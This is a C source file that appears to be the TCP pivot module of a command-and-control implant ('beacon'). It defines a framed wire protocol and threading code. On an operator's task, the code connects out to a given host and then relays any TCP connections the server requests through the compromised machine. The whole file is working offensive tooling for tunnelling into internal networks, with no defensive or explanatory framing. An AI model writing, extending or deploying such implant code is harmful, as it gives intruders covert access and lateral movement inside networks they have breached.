// TCP pivot — per-connection threading model (Linux port).
//
// Wire protocol (both directions):
//   Frame: [u8 type][u64 conn_id BE][u32 payload_len BE][payload]
//
//   Server → Beacon:
//     0x01 CONNECT  payload = [u16 port BE][host utf-8]
//     0x04 DATA     payload = raw bytes
//     0x05 CLOSE    payload empty
//
//   Beacon → Server:
//     0x02 CONNECT_OK   payload empty
//     0x03 CONNECT_FAIL payload empty
//     0x04 DATA         payload = raw bytes
//     0x05 CLOSE        payload empty

#include "../core/beacon.h"
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netdb.h>
#include <netinet/tcp.h>

#define PV_CONNECT      0x01
#define PV_CONNECT_OK   0x02
#define PV_CONNECT_FAIL 0x03
#define PV_DATA         0x04
#define PV_CLOSE        0x05

#define PV_MAX_CONNS    256
#define PV_BUF          32768

// ---- globals ----------------------------------------------------------------

static int              g_pipe     = -1;
static pthread_mutex_t  g_pipe_mtx = PTHREAD_MUTEX_INITIALIZER;
static volatile int     g_pv_alive = 0;

// Per-connection registry: maps conn_id → the server-facing socket of the pair.
typedef struct {
    uint64_t id;
    int      srv_end;   // reader thread writes DATA/CLOSE here
} PvReg;

static PvReg            g_reg[PV_MAX_CONNS];
static pthread_mutex_t  g_reg_mtx = PTHREAD_MUTEX_INITIALIZER;

// ---- helpers ----------------------------------------------------------------

static void pv_u64_be(uint8_t* p, uint64_t v) {
    p[0]=(uint8_t)(v>>56); p[1]=(uint8_t)(v>>48);
    p[2]=(uint8_t)(v>>40); p[3]=(uint8_t)(v>>32);
    p[4]=(uint8_t)(v>>24); p[5]=(uint8_t)(v>>16);
    p[6]=(uint8_t)(v>> 8); p[7]=(uint8_t)(v);
}
static uint64_t pv_rd_u64(const uint8_t* p) {
    return ((uint64_t)p[0]<<56)|((uint64_t)p[1]<<48)|
           ((uint64_t)p[2]<<40)|((uint64_t)p[3]<<32)|
           ((uint64_t)p[4]<<24)|((uint64_t)p[5]<<16)|
           ((uint64_t)p[6]<< 8)| (uint64_t)p[7];
}
static void pv_u32_be(uint8_t* p, uint32_t v) {
    p[0]=(uint8_t)(v>>24); p[1]=(uint8_t)(v>>16);
    p[2]=(uint8_t)(v>> 8); p[3]=(uint8_t)(v);
}
static uint32_t pv_rd_u32(const uint8_t* p) {
    return ((uint32_t)p[0]<<24)|((uint32_t)p[1]<<16)|
           ((uint32_t)p[2]<< 8)| (uint32_t)p[3];
}

static void port_to_str(uint32_t port, char* buf) {
    char tmp[8]; int n = 0;
    if (!port) { buf[0]='0'; buf[1]=0; return; }
    while (port) { tmp[n++]=(char)('0'+port%10); port/=10; }
    int i=0; while(n) buf[i++]=tmp[--n]; buf[i]=0;
}

// Receive exactly n bytes (blocking).
static int pv_recv_exact(int fd, uint8_t* buf, int n) {
    int got = 0;
    while (got < n) {
        ssize_t r = read(fd, buf + got, (size_t)(n - got));
        if (r <= 0) return -1;
        got += (int)r;
    }
    return 0;
}

// Send all bytes (blocking).
static int pv_send_all(int fd, const uint8_t* buf, int n) {
    int sent = 0;
    while (sent < n) {
        ssize_t r = write(fd, buf + sent, (size_t)(n - sent));
        if (r <= 0) return -1;
        sent += (int)r;
    }
    return 0;
}

// Send a framed message to g_pipe, serialised with g_pipe_mtx.
static int pv_pipe_frame(uint8_t type, uint64_t id,
                         const uint8_t* pay, uint32_t plen) {
    uint8_t hdr[13];
    hdr[0] = type;
    pv_u64_be(hdr + 1, id);
    pv_u32_be(hdr + 9, plen);
    pthread_mutex_lock(&g_pipe_mtx);
    int r = pv_send_all(g_pipe, hdr, 13);
    if (r == 0 && plen > 0)
        r = pv_send_all(g_pipe, pay, (int)plen);
    pthread_mutex_unlock(&g_pipe_mtx);
    return r;
}

// ---- registry helpers -------------------------------------------------------

static void reg_add(uint64_t id, int srv_end) {
    pthread_mutex_lock(&g_reg_mtx);
    for (int i = 0; i < PV_MAX_CONNS; ++i) {
        if (g_reg[i].srv_end < 0) {
            g_reg[i].id      = id;
            g_reg[i].srv_end = srv_end;
            break;
        }
    }
    pthread_mutex_unlock(&g_reg_mtx);
}

static void reg_remove(uint64_t id) {
    pthread_mutex_lock(&g_reg_mtx);
    for (int i = 0; i < PV_MAX_CONNS; ++i) {
        if (g_reg[i].srv_end >= 0 && g_reg[i].id == id) {
            g_reg[i].srv_end = -1;
            break;
        }
    }
    pthread_mutex_unlock(&g_reg_mtx);
}

// Write data to the srv_end of the connection's socket pair.
static int reg_deliver(uint64_t id, const uint8_t* data, int len) {
    pthread_mutex_lock(&g_reg_mtx);
    int s = -1;
    for (int i = 0; i < PV_MAX_CONNS; ++i) {
        if (g_reg[i].srv_end >= 0 && g_reg[i].id == id) {
            s = g_reg[i].srv_end;
            break;
        }
    }
    pthread_mutex_unlock(&g_reg_mtx);
    if (s < 0) return -1;
    return pv_send_all(s, data, len);
}

// Close the srv_end — this signals EOF to the conn thread's relay loop.
static void reg_close(uint64_t id) {
    pthread_mutex_lock(&g_reg_mtx);
    int s = -1, slot = -1;
    for (int i = 0; i < PV_MAX_CONNS; ++i) {
        if (g_reg[i].srv_end >= 0 && g_reg[i].id == id) {
            s    = g_reg[i].srv_end;
            slot = i;
            break;
        }
    }
    if (slot >= 0) g_reg[slot].srv_end = -1;
    pthread_mutex_unlock(&g_reg_mtx);
    if (s >= 0) close(s);
}

// ---- per-connection thread --------------------------------------------------

typedef struct {
    uint64_t id;
    char     host[256];
    uint16_t port;
    int      conn_end;  // conn thread owns this end of the socket pair
} PvConnArg;

static void* pv_conn_thread(void* arg) {
    PvConnArg* a = (PvConnArg*)arg;
    uint64_t id       = a->id;
    int      conn_end = a->conn_end;

    // Connect to target (blocking).
    char portstr[8]; port_to_str(a->port, portstr);
    struct addrinfo hints, *res = NULL;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    int target = -1;
    if (getaddrinfo(a->host, portstr, &hints, &res) == 0 && res) {
        target = socket(res->ai_family, SOCK_STREAM, 0);
        if (target >= 0) {
            sock_nosigpipe(target);
            if (connect(target, res->ai_addr, res->ai_addrlen) != 0) {
                close(target);
                target = -1;
            } else {
                int one = 1;
                setsockopt(target, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
            }
        }
        freeaddrinfo(res);
    }
    bfree(a);

    if (target < 0) {
        bdbg("pv_conn: connect FAIL\n");
        pv_pipe_frame(PV_CONNECT_FAIL, id, NULL, 0);
        reg_remove(id);
        close(conn_end);
        return NULL;
    }

    bdbg("pv_conn: connect OK, sending CONNECT_OK\n");
    if (pv_pipe_frame(PV_CONNECT_OK, id, NULL, 0) != 0) {
        close(target);
        reg_remove(id);
        close(conn_end);
        return NULL;
    }

    // Relay: conn_end ↔ target.
    uint8_t* buf = (uint8_t*)bmalloc(PV_BUF);
    if (!buf) {
        close(target);
        reg_remove(id);
        close(conn_end);
        return NULL;
    }

    fd_set rfds;
    for (;;) {
        FD_ZERO(&rfds);
        FD_SET(conn_end, &rfds);
        FD_SET(target,   &rfds);
        int nfds = (conn_end > target ? conn_end : target) + 1;
        if (select(nfds, &rfds, NULL, NULL, NULL) <= 0) break;

        if (FD_ISSET(conn_end, &rfds)) {
            // Data from server → forward to target.
            ssize_t n = read(conn_end, buf, PV_BUF);
            if (n <= 0) break;
            if (pv_send_all(target, buf, (int)n) != 0) break;
        }
        if (FD_ISSET(target, &rfds)) {
            // Data from target → forward to server as PV_DATA frame.
            ssize_t n = read(target, buf, PV_BUF);
            if (n <= 0) {
                bdbg("pv_conn: target EOF\n");
                pv_pipe_frame(PV_CLOSE, id, NULL, 0);
                break;
            }
            if (pv_pipe_frame(PV_DATA, id, buf, (uint32_t)n) != 0) break;
        }
    }

    bfree(buf);
    close(target);
    reg_remove(id);
    close(conn_end);
    return NULL;
}

// ---- reader / dispatcher thread ---------------------------------------------

static void* pv_reader(void* p) {
    (void)p;
    bdbg("pv_reader: started\n");

    uint8_t  hdr[13];
    uint8_t* payload  = NULL;
    uint32_t pay_cap  = 0;

    for (;;) {
        // Read fixed 13-byte header (blocking).
        if (pv_recv_exact(g_pipe, hdr, 13) != 0) break;

        uint8_t  type    = hdr[0];
        uint64_t id      = pv_rd_u64(hdr + 1);
        uint32_t pay_len = pv_rd_u32(hdr + 9);

        // Read payload.
        if (pay_len > 0) {
            if (pay_len > pay_cap) {
                bfree(payload);
                payload = (uint8_t*)bmalloc(pay_len);
                pay_cap = payload ? pay_len : 0;
                if (!payload) break;
            }
            if (pv_recv_exact(g_pipe, payload, (int)pay_len) != 0) break;
        }

        switch (type) {
        case PV_CONNECT: {
            if (pay_len < 2) break;
            uint16_t dport = (uint16_t)((payload[0] << 8) | payload[1]);
            uint32_t hlen  = pay_len - 2;
            if (hlen >= 256) hlen = 255;

            // Spawn per-connection thread.
            PvConnArg* carg = (PvConnArg*)bmalloc(sizeof(PvConnArg));
            if (!carg) { pv_pipe_frame(PV_CONNECT_FAIL, id, NULL, 0); break; }
            memset(carg, 0, sizeof(*carg));
            carg->id   = id;
            carg->port = dport;
            memcpy(carg->host, payload + 2, hlen);
            carg->host[hlen] = 0;

            // socketpair — Linux native, no loopback hack needed.
            int pair[2];
            if (socketpair(AF_UNIX, SOCK_STREAM, 0, pair) != 0) {
                bfree(carg);
                pv_pipe_frame(PV_CONNECT_FAIL, id, NULL, 0);
                break;
            }
            // pair[0] = conn thread's end, pair[1] = reader/server-facing end.
            carg->conn_end = pair[0];
            reg_add(id, pair[1]);

            pthread_t th;
            if (pthread_create(&th, NULL, pv_conn_thread, carg) != 0) {
                bfree(carg);
                close(pair[0]); close(pair[1]);
                reg_remove(id);
                pv_pipe_frame(PV_CONNECT_FAIL, id, NULL, 0);
            } else {
                pthread_detach(th);
                bdbg("pv_reader: CONNECT — spawned conn thread\n");
            }
            break;
        }
        case PV_DATA:
            if (pay_len > 0)
                reg_deliver(id, payload, (int)pay_len);
            break;
        case PV_CLOSE:
            reg_close(id);
            break;
        }
    }

    bdbg("pv_reader: pipe closed — cleaning up\n");
    bfree(payload);

    // Close all open srv_ends so conn threads exit their relay loops.
    pthread_mutex_lock(&g_reg_mtx);
    for (int i = 0; i < PV_MAX_CONNS; ++i) {
        if (g_reg[i].srv_end >= 0) {
            close(g_reg[i].srv_end);
            g_reg[i].srv_end = -1;
        }
    }
    pthread_mutex_unlock(&g_reg_mtx);

    if (g_pipe >= 0) { close(g_pipe); g_pipe = -1; }
    __atomic_store_n(&g_pv_alive, 0, __ATOMIC_SEQ_CST);
    return NULL;
}

// ---- OP_TCP_PIVOT -----------------------------------------------------------

void cmd_tcp_pivot(const BeaconTask* t) {
    if (__atomic_load_n(&g_pv_alive, __ATOMIC_SEQ_CST))
        return;  // already running

    // Initialise registry.
    pthread_mutex_lock(&g_reg_mtx);
    for (int i = 0; i < PV_MAX_CONNS; ++i)
        g_reg[i].srv_end = -1;
    pthread_mutex_unlock(&g_reg_mtx);

    char     host[256] = {0};
    uint32_t port      = 0;
    kv_get_str(t->pay, t->pay_len, "host", host, sizeof(host));
    kv_get_u32(t->pay, t->pay_len, "port", &port);

    char portstr[8]; port_to_str(port, portstr);

    struct addrinfo hints, *res = NULL;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host, portstr, &hints, &res) != 0 || !res) return;

    int s = socket(res->ai_family, SOCK_STREAM, 0);
    if (s >= 0) sock_nosigpipe(s);
    int ok = 0;
    if (s >= 0 && connect(s, res->ai_addr, res->ai_addrlen) == 0)
        ok = 1;
    freeaddrinfo(res);

    if (!ok) {
        if (s >= 0) close(s);
        return;
    }

    g_pipe = s;
    __atomic_store_n(&g_pv_alive, 1, __ATOMIC_SEQ_CST);

    pthread_t th;
    if (pthread_create(&th, NULL, pv_reader, NULL) != 0) {
        close(s); g_pipe = -1;
        __atomic_store_n(&g_pv_alive, 0, __ATOMIC_SEQ_CST);
    } else {
        pthread_detach(th);
    }
}
